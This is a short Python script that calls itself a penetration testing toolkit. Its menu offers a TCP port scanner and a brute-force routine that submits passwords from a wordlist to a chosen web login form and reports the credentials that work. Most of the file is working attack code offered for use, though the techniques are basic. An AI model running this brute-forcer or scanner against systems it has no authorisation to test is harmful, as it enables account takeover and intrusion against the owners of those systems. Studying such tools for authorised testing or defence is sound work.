import argparse
import socket
import requests
import ipaddress

# =========================
# Penetration Testing Toolkit
# =========================

# Function: Port Scanner
# This scans specific ports on a target IP to check if they are open.
def port_scanner():
    while True:
        target = input("Enter target IP address: ")
        try:
            ipaddress.ip_address(target)  # Validate IP address format
            break
        except ValueError:
            print("❌ Invalid IP address! Please enter a correct IPv4 address (e.g., 192.168.1.1).")

    # Get ports from user and convert them to integers
    ports = input("Enter ports to scan (comma-separated): ").split(',')
    try:
        ports = list(map(int, ports))  # Ensure ports are valid numbers
    except ValueError:
        print("❌ Invalid input! Please enter numeric values for ports.")
        return

    print(f"🔍 Scanning {target}...")
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)  # Timeout to avoid long waits
        result = s.connect_ex((target, port))
        if result == 0:
            print(f"✅ Port {port} is open")
        s.close()

# Function: Brute Force Attack for Web Login Forms
# Tries different passwords from a wordlist to guess a login.
def brute_force():
    url = input("Enter login URL: ")
    username = input("Enter username: ")
    wordlist = input("Enter path to password wordlist: ")
    
    try:
        with open(wordlist, 'r') as f:
            for password in f.readlines():
                password = password.strip()
                data = {"username": username, "password": password}
                response = requests.post(url, data=data)
                if "incorrect" not in response.text.lower():
                    print(f"🎉 Login successful: {username}:{password}")
                    return
    except FileNotFoundError:
        print("❌ Wordlist file not found! Please enter a valid file path.")
    print("❌ Brute force attack failed. Try a different wordlist.")

# Function: Main Menu
# Displays the available penetration testing tools
def main():
    print("===============================")
    print("🔐 Penetration Testing Toolkit 🔍")
    print("===============================")
    print("1️⃣  Port Scanner")
    print("2️⃣  Brute Force Attack")
    choice = input("Choose an option (1/2): ")
    
    if choice == "1":
        port_scanner()
    elif choice == "2":
        brute_force()
    else:
        print("❌ Invalid option. Please choose 1 or 2.")

if __name__ == "__main__":
    main()
